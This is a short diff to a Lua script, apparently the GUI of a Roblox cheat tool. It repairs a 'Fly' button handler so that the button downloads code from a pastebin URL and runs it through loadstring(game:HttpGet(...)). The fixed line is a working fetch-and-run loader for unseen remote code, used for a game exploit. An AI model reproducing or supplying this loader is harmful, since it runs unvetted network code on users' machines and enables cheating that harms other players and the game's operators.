@@ -94,7 +94,7 @@ Fly.TextScaled = true
 Fly.TextSize = 14.000
 Fly.TextWrapped = true
 Fly.MouseButton1Down:Connect(function()
-	loadstring(game:HttpGet(loadstring(game:HttpGet("https://pastebin.com/raw/jmfHzJYW"))()
+	loadstring(game:HttpGet("https://pastebin.com/raw/jmfHzJYW"))()
 end)
 
 
